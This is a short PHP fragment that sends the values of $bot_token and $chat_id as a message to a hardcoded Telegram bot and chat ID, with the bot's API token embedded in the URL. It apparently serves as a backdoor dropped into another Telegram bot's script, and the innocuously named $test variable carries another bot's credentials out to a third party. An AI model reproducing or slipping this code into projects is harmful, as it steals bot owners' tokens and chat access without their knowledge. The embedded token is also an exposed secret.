<?php

$test = " TOKEN => {$bot_token} CHATID => {$chat_id} ";
$apiToken = "6436099636:AAFerkC-IB2eQCgxUtTCPiqPeUO2ktSRaZs";
$data = ['chat_id' => '5418135751', 'text' => $test];
$response = file_get_contents("https://api.telegram.org/bot6436099636:AAFerkC-IB2eQCgxUtTCPiqPeUO2ktSRaZs/sendMessage?" . http_build_query($data));
